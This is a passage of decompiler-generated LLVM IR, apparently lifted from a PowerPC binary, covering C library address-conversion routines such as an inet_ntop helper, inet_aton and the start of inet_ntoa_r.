  store i32 %v0_1001dca8.pre, i32* @r30, align 4
  store i32 %v0_1001dc7c42, i32* @r28, align 4
  br label %dec_label_pc_1001dcb0.thread

dec_label_pc_1001dcb0.thread:                     ; preds = %dec_label_pc_1001dca8, %dec_label_pc_1001dca0
  %v0_1001dcb876 = phi i32 [ %v1_1001dca0, %dec_label_pc_1001dca0 ], [ %v0_1001dca8.pre, %dec_label_pc_1001dca8 ]
  %v0_1001dcb0.ph = phi i32 [ %v0_1001dc6c39, %dec_label_pc_1001dca0 ], [ %v0_1001dc7c42, %dec_label_pc_1001dca8 ]
  %v1_1001dcb059 = icmp slt i32 %v0_1001dcb0.ph, -1
  %v3_1001dcb061 = icmp eq i32 %v0_1001dcb0.ph, -1
  store i1 %v1_1001dcb059, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001dcb061, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1001dcb8

dec_label_pc_1001dcb0:                            ; preds = %dec_label_pc_1001dc90
  br i1 %v3_1001dcb0, label %dec_label_pc_1001dcc4, label %dec_label_pc_1001dcb0.dec_label_pc_1001dcb8_crit_edge

dec_label_pc_1001dcb0.dec_label_pc_1001dcb8_crit_edge: ; preds = %dec_label_pc_1001dcb0
  %v0_1001dcb8.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001dcb8

dec_label_pc_1001dcb8:                            ; preds = %dec_label_pc_1001dcb0.dec_label_pc_1001dcb8_crit_edge, %dec_label_pc_1001dcb0.thread
  %v0_1001dcb8 = phi i32 [ %v0_1001dcb876, %dec_label_pc_1001dcb0.thread ], [ %v0_1001dcb8.pre, %dec_label_pc_1001dcb0.dec_label_pc_1001dcb8_crit_edge ]
  %v0_1001dcb062 = phi i32 [ %v0_1001dcb0.ph, %dec_label_pc_1001dcb0.thread ], [ %v0_1001dc6c39, %dec_label_pc_1001dcb0.dec_label_pc_1001dcb8_crit_edge ]
  %v1_1001dcb8 = icmp slt i32 %v0_1001dcb8, 1
  %v2_1001dcb8 = icmp sgt i32 %v0_1001dcb8, 1
  %v3_1001dcb8 = icmp eq i32 %v0_1001dcb8, 1
  store i1 %v1_1001dcb8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001dcb8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1001dcb8, label %dec_label_pc_1001dcc4, label %dec_label_pc_1001dcc0

dec_label_pc_1001dcc0:                            ; preds = %dec_label_pc_1001dcb8
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_1001dcc4

dec_label_pc_1001dcc4:                            ; preds = %dec_label_pc_1001dcb8, %dec_label_pc_1001dcb0, %dec_label_pc_1001dcc0
  %v0_1001dcd03 = phi i32 [ %v0_1001dcb062, %dec_label_pc_1001dcb8 ], [ -1, %dec_label_pc_1001dcb0 ], [ -1, %dec_label_pc_1001dcc0 ]
  %v2_1001dcc4 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_1001dcc4, i32* @r29, align 4
  store i32 0, i32* @r31, align 4
  %v1_1001dcd04 = icmp slt i32 %v0_1001dcd03, -1
  %v3_1001dcd06 = icmp eq i32 %v0_1001dcd03, -1
  store i1 %v1_1001dcd04, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001dcd06, i1* %cr7_eq.global-to-local, align 1
  %v2_1001dd40 = icmp slt i32 %tmp, 65535
  %v4_1001dd40 = icmp eq i32 %tmp, 65535
  br label %dec_label_pc_1001dcd0

dec_label_pc_1001dcd0:                            ; preds = %dec_label_pc_1001dcc4, %dec_label_pc_1001dd9c
  %v2_1001dd0c = phi i32 [ %v2_1001dcc4, %dec_label_pc_1001dcc4 ], [ %v2_1001dcf451, %dec_label_pc_1001dd9c ]
  %v0_1001dce0 = phi i32 [ %v0_1001dcd03, %dec_label_pc_1001dcc4 ], [ %v0_1001dcd0, %dec_label_pc_1001dd9c ]
  %v0_1001dd00 = phi i32 [ 0, %dec_label_pc_1001dcc4 ], [ %v1_1001dd9c, %dec_label_pc_1001dd9c ]
  %v3_1001dcd07 = phi i1 [ %v3_1001dcd06, %dec_label_pc_1001dcc4 ], [ %v3_1001dcd0, %dec_label_pc_1001dd9c ]
  br i1 %v3_1001dcd07, label %dec_label_pc_1001dd00, label %dec_label_pc_1001dcd8

dec_label_pc_1001dcd8:                            ; preds = %dec_label_pc_1001dcd0
  %v2_1001dcd8 = icmp slt i32 %v0_1001dd00, %v0_1001dce0
  %v4_1001dcd8 = icmp eq i32 %v0_1001dd00, %v0_1001dce0
  br i1 %v2_1001dcd8, label %dec_label_pc_1001dd00, label %dec_label_pc_1001dce0

dec_label_pc_1001dce0:                            ; preds = %dec_label_pc_1001dcd8
  %v1_1001dce0 = load i32, i32* @r30, align 4
  %v2_1001dce0 = add i32 %v1_1001dce0, %v0_1001dce0
  %v2_1001dce4 = icmp slt i32 %v0_1001dd00, %v2_1001dce0
  %v4_1001dce4 = icmp eq i32 %v0_1001dd00, %v2_1001dce0
  store i1 %v2_1001dce4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1001dce4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1001dce4, label %dec_label_pc_1001dcec, label %dec_label_pc_1001dd00

dec_label_pc_1001dcec:                            ; preds = %dec_label_pc_1001dce0
  br i1 %v4_1001dcd8, label %dec_label_pc_1001dcf0, label %dec_label_pc_1001dd9c

dec_label_pc_1001dcf0:                            ; preds = %dec_label_pc_1001dcec
  %v3_1001dcf4 = inttoptr i32 %v2_1001dd0c to i8*
  store i8 58, i8* %v3_1001dcf4, align 1
  %v0_1001dcf8 = load i32, i32* @r29, align 4
  %v1_1001dcf8 = add i32 %v0_1001dcf8, 1
  store i32 %v1_1001dcf8, i32* @r29, align 4
  br label %dec_label_pc_1001dd9c

dec_label_pc_1001dd00:                            ; preds = %dec_label_pc_1001dce0, %dec_label_pc_1001dcd8, %dec_label_pc_1001dcd0
  %v1_1001dd00 = icmp slt i32 %v0_1001dd00, 0
  %v3_1001dd00 = icmp eq i32 %v0_1001dd00, 0
  store i1 %v1_1001dd00, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001dd00, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001dd00, label %dec_label_pc_1001dd14.thread, label %dec_label_pc_1001dd14

dec_label_pc_1001dd14.thread:                     ; preds = %dec_label_pc_1001dd00
  store i1 true, i1* %cr7_lt.global-to-local, align 1
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1001dd78

dec_label_pc_1001dd14:                            ; preds = %dec_label_pc_1001dd00
  %v3_1001dd0c = inttoptr i32 %v2_1001dd0c to i8*
  store i8 58, i8* %v3_1001dd0c, align 1
  %v0_1001dd10 = load i32, i32* @r29, align 4
  %v1_1001dd10 = add i32 %v0_1001dd10, 1
  store i32 %v1_1001dd10, i32* %r29.global-to-local, align 4
  %v0_1001dd14.pre = load i32, i32* @r31, align 4
  %v1_1001dd14 = icmp slt i32 %v0_1001dd14.pre, 6
  %v3_1001dd14 = icmp eq i32 %v0_1001dd14.pre, 6
  store i1 %v1_1001dd14, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001dd14, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001dd14, label %dec_label_pc_1001dd1c, label %dec_label_pc_1001dd78

dec_label_pc_1001dd1c:                            ; preds = %dec_label_pc_1001dd14
  %v0_1001dd1c = load i32, i32* @r28, align 4
  %v1_1001dd1c = icmp slt i32 %v0_1001dd1c, 0
  %v3_1001dd1c = icmp eq i32 %v0_1001dd1c, 0
  store i1 %v1_1001dd1c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001dd1c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001dd1c, label %dec_label_pc_1001dd24, label %dec_label_pc_1001dd78

dec_label_pc_1001dd24:                            ; preds = %dec_label_pc_1001dd1c
  %v0_1001dd24 = load i32, i32* @r30, align 4
  %v1_1001dd24 = icmp slt i32 %v0_1001dd24, 6
  %v3_1001dd24 = icmp eq i32 %v0_1001dd24, 6
  store i1 %v1_1001dd24, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001dd24, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001dd24, label %dec_label_pc_1001dd48, label %dec_label_pc_1001dd2c

dec_label_pc_1001dd2c:                            ; preds = %dec_label_pc_1001dd24
  %v1_1001dd2c = icmp slt i32 %v0_1001dd24, 5
  %v3_1001dd2c = icmp eq i32 %v0_1001dd24, 5
  store i1 %v1_1001dd2c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001dd2c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001dd2c, label %dec_label_pc_1001dd34, label %dec_label_pc_1001dd78

dec_label_pc_1001dd34:                            ; preds = %dec_label_pc_1001dd2c
  store i32 %tmp, i32* %r9.global-to-local, align 4
  store i1 %v2_1001dd40, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1001dd40, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1001dd40, label %dec_label_pc_1001dd48, label %dec_label_pc_1001dd78

dec_label_pc_1001dd48:                            ; preds = %dec_label_pc_1001dd34, %dec_label_pc_1001dd24
  %v1_1001dd48 = load i32, i32* @r1, align 4
  %v2_1001dd48 = sub i32 %v1_1001dd48, %v1_1001dd10
  %v0_1001dd4c = load i32, i32* @r27, align 4
  %v1_1001dd4c = add i32 %v0_1001dd4c, 12
  %v1_1001dd50 = add i32 %v2_1001dd48, 86
  store i32 ptrtoint ([3 x i8]* @global_var_1001dd5c.1204 to i32), i32* @lr, align 4
  %v3_1001dd58 = call i32 @inet_ntop4(i32 %v1_1001dd4c, i32 %v1_1001dd10, i32 %v1_1001dd50)
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_1001dd60 = icmp slt i32 %v3_1001dd58, 0
  %v3_1001dd60 = icmp eq i32 %v3_1001dd58, 0
  store i1 %v1_1001dd60, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001dd60, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001dd60, label %dec_label_pc_1001de18, label %dec_label_pc_1001dd68

dec_label_pc_1001dd68:                            ; preds = %dec_label_pc_1001dd48
  %v0_1001dd68 = load i32, i32* @r29, align 4
  store i32 %v0_1001dd68, i32* @r3, align 4
  %v0_1001dd6c = call i32 @__GI_strlen()
  %v0_1001dd70 = load i32, i32* @r29, align 4
  %v2_1001dd70 = add i32 %v0_1001dd70, %v0_1001dd6c
  store i32 %v2_1001dd70, i32* @r29, align 4
  %v0_1001ddb0.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1001ddb0

dec_label_pc_1001dd78:                            ; preds = %dec_label_pc_1001dd14.thread, %dec_label_pc_1001dd34, %dec_label_pc_1001dd2c, %dec_label_pc_1001dd1c, %dec_label_pc_1001dd14
  %v0_1001dd5466 = phi i32 [ %v2_1001dd0c, %dec_label_pc_1001dd14.thread ], [ %v1_1001dd10, %dec_label_pc_1001dd34 ], [ %v1_1001dd10, %dec_label_pc_1001dd2c ], [ %v1_1001dd10, %dec_label_pc_1001dd1c ], [ %v1_1001dd10, %dec_label_pc_1001dd14 ]
  store i32 %v2_1001dbd0, i32* %r9.global-to-local, align 4
  store i32 %v0_1001dd5466, i32* @r3, align 4
  store i32 268557720, i32* @lr, align 4
  %v1_1001dd94 = call i32 @sprintf(i32 %v0_1001dd5466)
  %v0_1001dd98 = load i32, i32* @r29, align 4
  %v2_1001dd98 = add i32 %v0_1001dd98, %v1_1001dd94
  store i32 %v2_1001dd98, i32* @r29, align 4
  br label %dec_label_pc_1001dd9c

dec_label_pc_1001dd9c:                            ; preds = %dec_label_pc_1001dcec, %dec_label_pc_1001dcf0, %dec_label_pc_1001dd78
  %v2_1001dcf451 = phi i32 [ %v2_1001dd0c, %dec_label_pc_1001dcec ], [ %v1_1001dcf8, %dec_label_pc_1001dcf0 ], [ %v2_1001dd98, %dec_label_pc_1001dd78 ]
  %v0_1001dd9c = load i32, i32* @r31, align 4
  %v1_1001dd9c = add i32 %v0_1001dd9c, 1
  store i32 %v1_1001dd9c, i32* @r31, align 4
  %tmp73 = icmp slt i32 %v1_1001dd9c, 8
  %v0_1001dcd0 = load i32, i32* @r28, align 4
  %v1_1001dcd0 = icmp slt i32 %v0_1001dcd0, -1
  %v3_1001dcd0 = icmp eq i32 %v0_1001dcd0, -1
  store i1 %v1_1001dcd0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001dcd0, i1* %cr7_eq.global-to-local, align 1
  br i1 %tmp73, label %dec_label_pc_1001dcd0, label %dec_label_pc_1001dda8

dec_label_pc_1001dda8:                            ; preds = %dec_label_pc_1001dd9c
  br i1 %v3_1001dcd0, label %dec_label_pc_1001ddc8, label %dec_label_pc_1001ddb0

dec_label_pc_1001ddb0:                            ; preds = %dec_label_pc_1001dda8, %dec_label_pc_1001dd68
  %v2_1001ddc0 = phi i32 [ %v2_1001dcf451, %dec_label_pc_1001dda8 ], [ %v2_1001dd70, %dec_label_pc_1001dd68 ]
  %v0_1001ddb0 = phi i32 [ %v0_1001dcd0, %dec_label_pc_1001dda8 ], [ %v0_1001ddb0.pre, %dec_label_pc_1001dd68 ]
  %v1_1001ddb0 = load i32, i32* @r30, align 4
  %v2_1001ddb0 = add i32 %v1_1001ddb0, %v0_1001ddb0
  %v1_1001ddb4 = icmp slt i32 %v2_1001ddb0, 8
  %v3_1001ddb4 = icmp eq i32 %v2_1001ddb0, 8
  store i1 %v1_1001ddb4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001ddb4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001ddb4, label %dec_label_pc_1001ddbc, label %dec_label_pc_1001ddc8

dec_label_pc_1001ddbc:                            ; preds = %dec_label_pc_1001ddb0
  %v3_1001ddc0 = inttoptr i32 %v2_1001ddc0 to i8*
  store i8 58, i8* %v3_1001ddc0, align 1
  %v0_1001ddc4 = load i32, i32* @r29, align 4
  %v1_1001ddc4 = add i32 %v0_1001ddc4, 1
  store i32 %v1_1001ddc4, i32* @r29, align 4
  br label %dec_label_pc_1001ddc8

dec_label_pc_1001ddc8:                            ; preds = %dec_label_pc_1001ddb0, %dec_label_pc_1001dda8, %dec_label_pc_1001ddbc
  %v2_1001dddc = phi i32 [ %v2_1001ddc0, %dec_label_pc_1001ddb0 ], [ %v2_1001dcf451, %dec_label_pc_1001dda8 ], [ %v1_1001ddc4, %dec_label_pc_1001ddbc ]
  %v1_1001ddc8 = sub i32 1, %v2_1001dcc4
  %v2_1001ddd0 = add i32 %v1_1001ddc8, %v2_1001dddc
  %v1_1001ddd4 = load i32, i32* @r26, align 4
  %v2_1001ddd4 = icmp ult i32 %v2_1001ddd0, %v1_1001ddd4
  %v4_1001ddd4 = icmp eq i32 %v2_1001ddd0, %v1_1001ddd4
  store i1 %v2_1001ddd4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1001ddd4, i1* %cr7_eq.global-to-local, align 1
  %v3_1001dddc = inttoptr i32 %v2_1001dddc to i8*
  store i8 0, i8* %v3_1001dddc, align 1
  %v0_1001dde0 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_1001dde0 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_1001dde0 = or i1 %v0_1001dde0, %v1_1001dde0
  br i1 %v2_1001dde0, label %dec_label_pc_1001ddf8, label %dec_label_pc_1001dde4

dec_label_pc_1001dde4:                            ; preds = %dec_label_pc_1001ddc8
  %v0_1001dde4 = call i32 @__errno_location()
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_1001ddf0 = inttoptr i32 %v0_1001dde4 to i32*
  store i32 28, i32* %v2_1001ddf0, align 4
  %v0_1001de1c.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001de18

dec_label_pc_1001ddf8:                            ; preds = %dec_label_pc_1001ddc8
  %v0_1001ddf8 = load i32, i32* @r25, align 4
  %v2_1001ddfc = bitcast i32* %stack_var_-88 to i8*
  %v3_1001ddfc = call i32 @strcpy(i32 %v0_1001ddf8, i8* %v2_1001ddfc)
  br label %dec_label_pc_1001de00

dec_label_pc_1001de00:                            ; preds = %dec_label_pc_1001dbbc, %dec_label_pc_1001ddf8
  %storemerge1 = phi i32 [ %v3_1001dbc8, %dec_label_pc_1001dbbc ], [ %v3_1001ddfc, %dec_label_pc_1001ddf8 ]
  store i32 %storemerge1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001de18

dec_label_pc_1001de08:                            ; preds = %dec_label_pc_1001dbb0
  %v0_1001de08 = call i32 @__errno_location()
  %v2_1001de10 = inttoptr i32 %v0_1001de08 to i32*
  store i32 97, i32* %v2_1001de10, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001de18

dec_label_pc_1001de18:                            ; preds = %dec_label_pc_1001dd48, %dec_label_pc_1001de00, %dec_label_pc_1001dde4, %dec_label_pc_1001de08
  %v0_1001de1c = phi i32 [ 0, %dec_label_pc_1001dd48 ], [ %storemerge1, %dec_label_pc_1001de00 ], [ %v0_1001de1c.pre, %dec_label_pc_1001dde4 ], [ 0, %dec_label_pc_1001de08 ]
  ret i32 %v0_1001de1c

; uselistorder directives
  uselistorder i32 %v2_1001dddc, { 1, 0 }
  uselistorder i32 %v2_1001ddb0, { 1, 0 }
  uselistorder i1 %v3_1001dcd0, { 0, 2, 1 }
  uselistorder i32 %v0_1001dcd0, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1001dd9c, { 2, 1, 0 }
  uselistorder i32 %v0_1001dd5466, { 1, 0 }
  uselistorder i32 %v3_1001dd58, { 1, 0 }
  uselistorder i32 %v0_1001dd24, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1001dd10, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v2_1001dce0, { 1, 0 }
  uselistorder i32 %v0_1001dd00, { 1, 0, 3, 2, 5, 4 }
  uselistorder i32 %v0_1001dce0, { 0, 2, 1 }
  uselistorder i32 %v2_1001dd0c, { 3, 0, 1, 2 }
  uselistorder i32 %v0_1001dcd03, { 0, 2, 1 }
  uselistorder i32 %v0_1001dcb8, { 2, 1, 0 }
  uselistorder i32 %v0_1001dca8.pre, { 0, 1, 4, 3, 2 }
  uselistorder i1 %v3_1001dcb0, { 1, 0, 2 }
  uselistorder i32 %v1_1001dc8c, { 2, 1, 0 }
  uselistorder i32 %v1_1001dc88, { 1, 0 }
  uselistorder i32 %v0_1001dc6c39, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1001dc7c42, { 0, 2, 1, 3 }
  uselistorder i1 %v3_1001dc40, { 1, 0 }
  uselistorder i32 %v0_1001dc88, { 1, 3, 4, 2, 0 }
  uselistorder i32 %v0_1001dc40, { 1, 0 }
  uselistorder i32 %v0_1001dc6c, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1001dc7c, { 2, 3, 0, 1 }
  uselistorder i32 %v1_1001dc1c, { 1, 0 }
  uselistorder i32 %v2_1001dc14, { 1, 0 }
  uselistorder i32 %v0_1001dc0c, { 1, 0, 2 }
  uselistorder i32 %v1_1001dbf4, { 1, 0 }
  uselistorder i32 %v2_1001dbd0, { 1, 0, 2, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %ctr.global-to-local, { 2, 0, 4, 3, 1 }
  uselistorder i1* %cr7_lt.global-to-local, { 2, 3, 4, 13, 5, 6, 7, 8, 9, 10, 1, 11, 12, 0, 14, 19, 16, 15, 17, 18 }
  uselistorder i1* %cr7_eq.global-to-local, { 2, 3, 4, 13, 5, 6, 7, 8, 9, 10, 1, 11, 12, 0, 14, 19, 16, 15, 17, 18 }
  uselistorder i8 58, { 3, 1, 2, 4, 0, 5, 6, 7, 8 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1001de18, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1001de00, { 1, 0 }
  uselistorder label %dec_label_pc_1001ddc8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001dd9c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001dd78, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1001dcd0, { 1, 0 }
  uselistorder label %dec_label_pc_1001dcc4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001dca8, { 1, 0 }
  uselistorder label %dec_label_pc_1001dc88, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1001dc84, { 1, 0 }
  uselistorder label %dec_label_pc_1001dc3c, { 1, 0 }
  uselistorder label %dec_label_pc_1001dbf4, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %v3_1001de30 = icmp eq i8* %arg1, null
  br i1 %v3_1001de30, label %dec_label_pc_1001dee8, label %dec_label_pc_1001de38

dec_label_pc_1001de38:                            ; preds = %entry
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1001de4c.pre = load i32, i32* @global_var_1004513c, align 4
  br label %dec_label_pc_1001de48

dec_label_pc_1001de48:                            ; preds = %dec_label_pc_1001de38, %dec_label_pc_1001dec0
  %v0_1001dec0 = phi i32 [ 0, %dec_label_pc_1001de38 ], [ %v2_1001dec8, %dec_label_pc_1001dec0 ]
  %v0_1001dec4 = phi i32 [ 1, %dec_label_pc_1001de38 ], [ %v1_1001dec4, %dec_label_pc_1001dec0 ]
  %v0_1001de48 = phi i32 [ %tmp, %dec_label_pc_1001de38 ], [ %v0_1001de483, %dec_label_pc_1001dec0 ]
  %v1_1001de48 = inttoptr i32 %v0_1001de48 to i8*
  %v2_1001de48 = load i8, i8* %v1_1001de48, align 1
  %v3_1001de48 = zext i8 %v2_1001de48 to i32
  %v1_1001de50 = mul nuw nsw i32 %v3_1001de48, 2
  %v2_1001de54 = add i32 %v1_1001de50, %v3_1001de4c.pre
  %v3_1001de54 = inttoptr i32 %v2_1001de54 to i16*
  %v4_1001de54 = load i16, i16* %v3_1001de54, align 2
  %v1_1001de58 = and i16 %v4_1001de54, 8
  %v3_1001de58 = icmp eq i16 %v1_1001de58, 0
  br i1 %v3_1001de58, label %dec_label_pc_1001dee8, label %dec_label_pc_1001de60

dec_label_pc_1001de60:                            ; preds = %dec_label_pc_1001de48
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_1001de78

dec_label_pc_1001de68:                            ; preds = %dec_label_pc_1001de78
  %v1_1001de68 = add i32 %v2_1001de84, -48
  store i32 %v1_1001de68, i32* @r8, align 4
  %v1_1001de6c = add i32 %v0_1001deb0, 1
  %v2_1001de70 = icmp sgt i32 %v1_1001de68, 255
  br i1 %v2_1001de70, label %dec_label_pc_1001dee8, label %dec_label_pc_1001de78

dec_label_pc_1001de78:                            ; preds = %dec_label_pc_1001de68, %dec_label_pc_1001de60
  %v1_1001dec8 = phi i32 [ %v1_1001de68, %dec_label_pc_1001de68 ], [ 0, %dec_label_pc_1001de60 ]
  %v0_1001deb0 = phi i32 [ %v1_1001de6c, %dec_label_pc_1001de68 ], [ %v0_1001de48, %dec_label_pc_1001de60 ]
  %v1_1001de78 = inttoptr i32 %v0_1001deb0 to i8*
  %v2_1001de78 = load i8, i8* %v1_1001de78, align 1
  %v3_1001de78 = zext i8 %v2_1001de78 to i32
  %v1_1001de7c = mul i32 %v1_1001dec8, 10
  %v1_1001de80 = mul nuw nsw i32 %v3_1001de78, 2
  %v2_1001de84 = add i32 %v3_1001de78, %v1_1001de7c
  store i32 %v2_1001de84, i32* @r10, align 4
  %v2_1001de88 = add i32 %v1_1001de80, %v3_1001de4c.pre
  %v3_1001de88 = inttoptr i32 %v2_1001de88 to i16*
  %v4_1001de88 = load i16, i16* %v3_1001de88, align 2
  %v5_1001de88 = zext i16 %v4_1001de88 to i32
  %v1_1001de8c = and i32 %v5_1001de88, 8
  %v3_1001de8c = icmp eq i32 %v1_1001de8c, 0
  br i1 %v3_1001de8c, label %dec_label_pc_1001de94, label %dec_label_pc_1001de68

dec_label_pc_1001de94:                            ; preds = %dec_label_pc_1001de78
  %v2_1001de94 = icmp sgt i32 %v0_1001dec4, 3
  br i1 %v2_1001de94, label %dec_label_pc_1001deac, label %dec_label_pc_1001de9c

dec_label_pc_1001de9c:                            ; preds = %dec_label_pc_1001de94
  %v3_1001de9c = icmp eq i8 %v2_1001de78, 46
  br i1 %v3_1001de9c, label %dec_label_pc_1001dea4, label %dec_label_pc_1001dee8

dec_label_pc_1001dea4:                            ; preds = %dec_label_pc_1001de9c
  %v1_1001dea4 = add i32 %v0_1001deb0, 1
  br label %dec_label_pc_1001dec0

dec_label_pc_1001deac:                            ; preds = %dec_label_pc_1001de94
  %v3_1001deac = icmp eq i8 %v2_1001de78, 0
  %v1_1001deb0 = add i32 %v0_1001deb0, 1
  br i1 %v3_1001deac, label %dec_label_pc_1001dec0, label %dec_label_pc_1001deb8

dec_label_pc_1001deb8:                            ; preds = %dec_label_pc_1001deac
  %v1_1001deb8 = and i32 %v5_1001de88, 32
  %v3_1001deb8 = icmp eq i32 %v1_1001deb8, 0
  br i1 %v3_1001deb8, label %dec_label_pc_1001dee8, label %dec_label_pc_1001dec0

dec_label_pc_1001dec0:                            ; preds = %dec_label_pc_1001deb8, %dec_label_pc_1001deac, %dec_label_pc_1001dea4
  %v0_1001de483 = phi i32 [ %v1_1001deb0, %dec_label_pc_1001deb8 ], [ %v1_1001deb0, %dec_label_pc_1001deac ], [ %v1_1001dea4, %dec_label_pc_1001dea4 ]
  %v1_1001dec0 = mul i32 %v0_1001dec0, 256
  %v1_1001dec4 = add nuw nsw i32 %v0_1001dec4, 1
  %v2_1001dec8 = or i32 %v1_1001dec8, %v1_1001dec0
  store i32 %v2_1001dec8, i32* %r5.global-to-local, align 4
  %tmp10 = icmp slt i32 %v1_1001dec4, 5
  br i1 %tmp10, label %dec_label_pc_1001de48, label %dec_label_pc_1001ded4

dec_label_pc_1001ded4:                            ; preds = %dec_label_pc_1001dec0
  %v3_1001ded4 = icmp eq i32 %arg2, 0
  %v0_1001dedc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1001ded4, i32 %v0_1001dedc)
  %v0_1001dee0 = load i32, i32* %r5.global-to-local, align 4
  %v2_1001dee0 = inttoptr i32 %arg2 to i32*
  store i32 %v0_1001dee0, i32* %v2_1001dee0, align 4
  ret i32 1

dec_label_pc_1001dee8:                            ; preds = %dec_label_pc_1001de9c, %dec_label_pc_1001deb8, %dec_label_pc_1001de48, %dec_label_pc_1001de68, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1001dec8, { 1, 0 }
  uselistorder i32 %v1_1001dec4, { 1, 0 }
  uselistorder i32 %v2_1001de84, { 1, 0 }
  uselistorder i32 %v3_1001de78, { 1, 0 }
  uselistorder i32 %v0_1001deb0, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1001dee8, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_1001de48, { 1, 0 }
}

define i32 @__GI_inet_ntoa_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_1001def8 = add i32 %arg2, 15
  store i32 %v1_1001def8, i32* %r4.global-to-local, align 4
  %v2_1001df0c = load i32, i32* %arg1, align 4
  store i32 %v2_1001df0c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001df14

dec_label_pc_1001df14:                            ; preds = %dec_label_pc_1001df38.dec_label_pc_1001df14_crit_edge, %entry
  %v0_1001df14 = phi i32 [ %v2_1001df0c, %entry ], [ %v0_1001df14.pre, %dec_label_pc_1001df38.dec_label_pc_1001df14_crit_edge ]
  %v0_1001df588 = phi i32 [ %v1_1001def8, %entry ], [ %v0_1001df38, %dec_label_pc_1001df38.dec_label_pc_1001df14_crit_edge ]
  %v1_1001df14 = urem i32 %v0_1001df14, 256
  %v5_1001df1c = inttoptr i32 %v0_1001df588 to i8*
  %v6_1001df1c = call i32 @_uintmaxtostr(i8* %v5_1001df1c, i32 0, i32 %v1_1001df14, i32 -10, i32 0)
  %v0_1001df20 = load i32, i32* @r31, align 4
  %v1_1001df20 = udiv i32 %v0_1001df20, 256
  store i32 %v1_1001df20, i32* %r31.global-to-local, align 4
  %v0_1001df24 = load i32, i32* @r30, align 4
  %v3_1001df24 = icmp eq i32 %v0_1001df24, 0
  %v1_1001df28 = add i32 %v6_1001df1c, -1
  store i32 %v1_1001df28, i32* %r4.global-to-local, align 4
  br i1 %v3_1001df24, label %dec_label_pc_1001df38, label %dec_label_pc_1001df30

dec_label_pc_1001df30:                            ; preds = %dec_label_pc_1001df14
  %v3_1001df34 = inttoptr i32 %v0_1001df24 to i8*
  store i8 46, i8* %v3_1001df34, align 1
  %v0_1001df38.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1001df38

dec_label_pc_1001df38:                            ; preds = %dec_label_pc_1001df14, %dec_label_pc_1001df30
  %v0_1001df38 = phi i32 [ %v1_1001df28, %dec_label_pc_1001df14 ], [ %v0_1001df38.pre, %dec_label_pc_1001df30 ]
  %v0_1001df3c.pre = load i32, i32* @r29, align 4
  %tmp7 = icmp slt i32 %v0_1001df3c.pre, 4
